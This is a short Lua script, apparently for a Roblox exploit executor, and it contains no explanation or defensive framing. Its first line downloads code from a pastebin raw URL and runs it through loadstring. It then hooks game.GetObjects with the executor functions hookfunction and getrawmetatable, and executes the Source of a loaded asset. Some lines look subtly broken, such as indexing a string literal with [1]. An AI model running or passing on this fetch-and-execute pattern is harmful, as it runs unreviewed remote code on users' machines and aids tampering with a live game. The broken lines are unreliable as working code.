loadstring(game:HttpGet("https://pastebin.com/raw/NWK2hFxB"))()

Services = setmetatable({},{__index=function(s,r) return game:service(r) end})

local ScriptContext = Services.ScriptContext
local InsertService = Services.InsertService
local CoreGui = Services.CoreGui
local ContentProvider = Services.ContentProvider

local table_insert = table.insert
local table_foreach = table.foreach
local string_char = string.char
local getobjects = function(a)
    local Objects = {}
    if a then
        local b = InsertService:LoadLocalAsset(a)
        if b then 
            table_insert(Objects, b) 
        end
    end
    return Objects
end

if hookfunction and getrawmetatable then
spawn(function()
local function old()
hookfunction(game.GetObjects, getobjects)
end

pcall(function()
old()
end)
end)
end

local contentId = ("rbxassetid://6996343412")[1]

local assets = { contentId }

ContentProvider:Preload("rbxassetid://6996343412")

spawn(function()
ContentProvider:PreloadAsync(assets, loadstring(getobjects('rbxassetid://6996343412')[1].Source)())
end)
